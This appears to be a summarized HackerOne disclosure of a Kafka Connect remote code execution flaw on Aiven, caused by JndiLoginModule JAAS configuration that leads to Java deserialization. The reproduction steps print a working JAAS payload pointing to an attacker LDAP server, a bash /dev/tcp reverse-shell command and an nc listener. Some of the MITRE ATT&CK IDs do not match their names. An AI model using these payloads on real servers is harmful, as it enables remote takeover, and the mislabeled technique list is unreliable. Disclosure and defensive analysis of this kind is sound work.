# Kafka Connect RCE via connector SASL JAAS JndiLoginModule configuration

## Metadata
- **Source:** HackerOne
- **Report:** 1529790 | https://hackerone.com/reports/1529790
- **Submitted:** 2022-04-04
- **Reporter:** jarij
- **Program:** Aiven
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** Remote Code Execution, Java Deserialization, LDAP Injection, Unsafe JAAS Configuration
- **CVEs:** None
- **Category:** memory-binary

## Summary
Kafka Connect allows attackers to configure arbitrary SASL JAAS properties including JndiLoginModule with attacker-controlled LDAP URLs. When the connector initiates authentication, it connects to a malicious LDAP server which returns a crafted serialized Java object that triggers deserialization gadget chains (System.setProperty + CommonsCollections7) to achieve RCE on the Kafka Connect server.

## Attack scenario
1. Attacker obtains access to Kafka Connect configuration API (either Aiven API or Kafka Connect REST API)
2. Attacker sets database.history.producer.sasl.jaas.config property with JndiLoginModule pointing to attacker's LDAP server
3. Attacker runs RogueJndi server with embedded malicious serialized gadget chain payload
4. Kafka Connect initiates SASL authentication and connects to attacker's LDAP server
5. LDAP server responds with serialized object containing System.setProperty gadget chain + CommonsCollections7 payload
6. Java deserialization in JAAS login context executes gadget chain, achieving command execution and reverse shell

## Root cause
Kafka Connect fails to restrict or sanitize JAAS configuration properties, allowing arbitrary JndiLoginModule configuration. The JAAS LoginContext deserializes objects from LDAP responses without validation, and the presence of vulnerable gadget chains in classpath (Scala stdlib + Apache Commons Collections) enables arbitrary code execution.

## Attacker mindset
An attacker with API access to Kafka Connect configuration seeks to establish persistent access. By leveraging the JAAS authentication flow and Java deserialization weaknesses, they can achieve RCE with minimal detection. The multi-stage approach (JNDI → LDAP → gadget chain) obfuscates the attack through standard authentication mechanisms.

## Defensive takeaways
- Restrict JAAS configuration properties - whitelist only safe authentication modules and disable JndiLoginModule if unused
- Implement strict validation and filtering of sasl.jaas.config connector properties at API level
- Remove or upgrade vulnerable deserialization gadget chains (Scala stdlib, Apache Commons Collections) from Kafka Connect classpath
- Enforce Java deserialization filters using JEP 290 to block dangerous object types
- Implement authentication and authorization controls on Kafka Connect REST API and configuration endpoints
- Monitor outbound LDAP/JNDI connections from Kafka Connect servers
- Use security manager to restrict access to JNDI providers and LDAP factories
- Regularly audit connector configuration changes and alert on suspicious JAAS modifications

## Variant hunting
Search for similar issues in other connectors using Debezium framework (PostgreSQL, SQL Server, MongoDB connectors). Check if other message queue systems (RabbitMQ, ActiveMQ) with configurable JAAS expose similar attack surface. Investigate if other properties beyond sasl.jaas.config allow JNDI injection (e.g., security.protocol, producer.*, consumer.* properties in connectors).

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1200 - Traffic Redirection
- T1559.001 - Inter-Process Communication: Local LDAP
- T1203 - Exploitation for Client Execution
- T1648 - Serverless Execution

## Notes
The exploit specifically targets Scala 2.13.6 version suggesting tight coupling between gadget chain and runtime libraries. The attacker creatively chained System.setProperty gadget from Scala stdlib with CommonsCollections7 to bypass potential filters. The vulnerability affects all Debezium connectors using the same configuration mechanism. This represents a significant supply chain risk for organizations using Aiven managed Kafka Connect service.

## Full report
<details><summary>Expand</summary>

## Summary:
When configuring the connector via the Aiven API or the Kafka Connect REST API, the attacker can set the `database.history.producer.sasl.jaas.config` connector property for the `io.debezium.connector.mysql.MySqlConnector` connector. This is likely true for other debezium connectors too.  By setting the connector value to `"com.sun.security.auth.module.JndiLoginModule required user.provider.url="ldap://attacker_server" useFirstPass="true" serviceName="x" debug="true" group.provider.url="xxx";"`, the server will connect to the attacker's LDAP server and it deserializes the LDAP response, which the attacker can use to execute java deserialization gadget chains on the kafka connect server.

## Steps To Reproduce:
██████

  1. Login into my VPS:  `ssh ███████`, password: `█████`
  1. Execute `java -jar RogueJndi-1.1.jar --hostname ███ -c "bash -c bash\${IFS}-i\${IFS}>&/dev/tcp/███/4445<&1"`
  1. Execute `nc -nlvp 4445` on another tab
  1. Execute `python3 poc.py` on another table. This poc script launches the exploit against my Aiven kafka connect instance.
  1. Reverse shell connection should now be established


## The gadget chain

The exploit uses `System.setProperty` gadget chain in the scala standard library to enable unsafe deserialization of apache commons collections transformers (finding this gadget chain took way too much time...). This payload has been designed for the Scala version 2.13.6. It may fail on other scala versions. Then the script executes the reverse shell setup command using the [CommonsCollections7](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections7.java) payload.

## Impact

Attacker can execute commands on the server and access other resources on the network.

</details>

---
*Analysed by Claude on 2026-05-12*
